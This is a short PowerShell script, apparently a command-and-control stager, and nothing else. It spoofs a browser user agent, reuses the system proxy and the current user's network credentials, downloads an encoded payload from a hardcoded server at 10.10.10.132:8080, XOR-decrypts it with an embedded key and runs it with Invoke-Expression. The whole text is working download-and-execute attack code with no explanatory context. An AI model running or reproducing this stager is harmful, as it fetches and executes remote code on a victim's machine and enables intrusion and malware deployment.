$wc = New-Object System.Net.WebClient
$u = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

$wc.Headers.Add("User-Agent", $u)
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

$K = "H%Y}<O#!XJ\hgkC`+vtN)7GxD95lfMn]"

$i = 0

[char[]]$B = ([char[]]($wc.DownloadString("http://10.10.10.132:8080/index.asp"))) | 
    ForEach-Object {$_ -BXor$K[$I++%$K.Length]}

Invoke-Expression ($b -join "")